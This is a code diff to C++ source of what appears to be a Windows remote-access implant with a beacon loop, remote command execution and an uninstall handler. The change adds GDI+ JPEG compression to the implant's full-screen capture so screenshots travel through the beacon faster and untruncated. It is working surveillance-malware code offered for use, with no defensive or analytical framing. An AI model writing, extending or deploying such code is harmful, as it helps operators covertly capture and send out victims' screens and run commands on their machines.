@@ -19,6 +19,14 @@
 #include <sstream>
 #include <iomanip>
 #include <algorithm>
+
+// GDI+ is optional: __has_include keeps a toolchain that ships without these
+// headers on the BMP path below instead of failing the build.
+#if __has_include(<gdiplus.h>)
+#define GHOST_JPEG 1
+#include <objidl.h>   // gdiplus.h needs IStream declared first
+#include <gdiplus.h>
+#endif
 #include <fstream>
 #include <stdio.h>
 #include <random>
@@ -1212,7 +1220,75 @@ static std::wstring HandleUninstall(const std::string& /*args*/) {
 }
 
 // =====================================================================
-//  SCREENSHOT — GDI full-screen capture → BMP → base64
+//  JPEG ENCODE (GDI+)
+// =====================================================================
+// A 1080p desktop is ~6 MB as 24bpp BMP and ~8 MB after base64, which makes
+// the beacon the slowest link in the tool. JPEG at quality 82 is typically a
+// few hundred KB for the same frame. Every failure path returns false so the
+// caller falls back to the BMP encoder -- !screenshot cannot regress because
+// of this.
+#ifdef GHOST_JPEG
+// Fixed, published GUIDs built by value: avoids initguid.h, __uuidof and the
+// uuid import library entirely.
+static const CLSID kJpegEncoderClsid =
+    { 0x557CF401, 0x01F0, 0x11D3, { 0xAC, 0xBD, 0x46, 0xA8, 0x61, 0x01, 0x97, 0x3D } };
+static const GUID  kEncoderQualityGuid =
+    { 0x1D5BE4B5, 0xFA4A, 0x452D, { 0x9C, 0xDD, 0x5D, 0xB3, 0x51, 0x05, 0xE7, 0xEB } };
+
+static bool EncodeJpegFromHBITMAP(HBITMAP hbmp, int quality, std::vector<BYTE>& out) {
+    static std::mutex jpegMtx;          // one GDI+ lifetime at a time
+    std::lock_guard<std::mutex> lk(jpegMtx);
+
+    ULONG_PTR token = 0;
+    Gdiplus::GdiplusStartupInput si;
+    if (Gdiplus::GdiplusStartup(&token, &si, nullptr) != Gdiplus::Ok) return false;
+
+    bool ok = false;
+    wchar_t dir[MAX_PATH] = {};
+    wchar_t tmpPath[MAX_PATH] = {};
+    // Save through a temp file rather than an IStream: no COM stream, no IID,
+    // no extra import library to get wrong.
+    if (GetTempPathW(MAX_PATH, dir) && GetTempFileNameW(dir, L"gh", 0, tmpPath)) {
+        Gdiplus::Bitmap* img = Gdiplus::Bitmap::FromHBITMAP(hbmp, nullptr);
+        if (img) {
+            LONG       q  = quality;
+            Gdiplus::EncoderParameter   p;
+            Gdiplus::EncoderParameters  ep;
+            p.Guid           = kEncoderQualityGuid;
+            p.NumberOfValues = 1;
+            p.Type           = 4;      // EncoderParameterValueTypeLong
+            p.Value          = &q;
+            ep.Count         = 1;
+            ep.Parameter[0]  = p;
+            if (img->Save(tmpPath, &kJpegEncoderClsid, &ep) == Gdiplus::Ok) {
+                HANDLE f = CreateFileW(tmpPath, GENERIC_READ,
+                                       FILE_SHARE_READ | FILE_SHARE_DELETE,
+                                       nullptr, OPEN_EXISTING,
+                                       FILE_ATTRIBUTE_NORMAL, nullptr);
+                if (f != INVALID_HANDLE_VALUE) {
+                    DWORD sz = GetFileSize(f, nullptr);
+                    if (sz != INVALID_FILE_SIZE && sz >= 64 && sz < 32u * 1024u * 1024u) {
+                        out.resize(sz);
+                        DWORD rd = 0;
+                        ok = ReadFile(f, out.data(), sz, &rd, nullptr) && rd == sz;
+                        if (!ok) out.clear();
+                    }
+                    CloseHandle(f);
+                }
+            }
+            delete img;
+        }
+        DeleteFileW(tmpPath);          // GetTempFileNameW created it; never leave it
+    }
+    Gdiplus::GdiplusShutdown(token);
+    return ok;
+}
+#else
+static bool EncodeJpegFromHBITMAP(HBITMAP, int, std::vector<BYTE>&) { return false; }
+#endif
+
+// =====================================================================
+//  SCREENSHOT — GDI full-screen capture → JPEG (GDI+) or BMP → base64
 // =====================================================================
 static std::wstring HandleScreenshot(const std::string& args) {
     try {
@@ -1250,6 +1326,14 @@ static std::wstring HandleScreenshot(const std::string& args) {
         SelectObject(hdcMem, hOld);
         DeleteDC(hdcMem);
         ReleaseDC(NULL, hdcScreen);
+
+        // Try JPEG first; hbmp is still alive for the BMP path if it fails.
+        std::vector<BYTE> jpeg;
+        if (EncodeJpegFromHBITMAP(hbmp, 82, jpeg)) {
+            DeleteObject(hbmp);
+            std::string b64 = Base64Encode(jpeg.data(), static_cast<DWORD>(jpeg.size()));
+            return L"[SCREENSHOT:JPEG]\n" + UTF8ToWString(b64);
+        }
 
         BITMAPINFOHEADER bi = {};
         bi.biSize        = sizeof(BITMAPINFOHEADER);
@@ -2043,11 +2127,12 @@ DWORD BeaconLoop(const Session& session) {
                 } else {
                     result = ExecuteCommand(task, status);
                 }
-                // Screenshots are multi-MB base64 BMPs — never truncate them,
+                // Screenshots are multi-MB base64 images — never truncate them,
                 // or the image data arrives corrupted. Text output keeps the
-                // 64 KB cap.
+                // 64 KB cap. Matches both [SCREENSHOT:JPEG] and the BMP fallback
+                // so the marker can grow without silently re-enabling truncation.
                 const bool isScreenshot =
-                    result.rfind(L"[SCREENSHOT:BMP]\n", 0) == 0;
+                    result.rfind(L"[SCREENSHOT:", 0) == 0;
                 const size_t cap = isScreenshot
                     ? 32u * 1024u * 1024u
                     : static_cast<size_t>(config::CMD_OUTPUT_MAX) / sizeof(wchar_t);
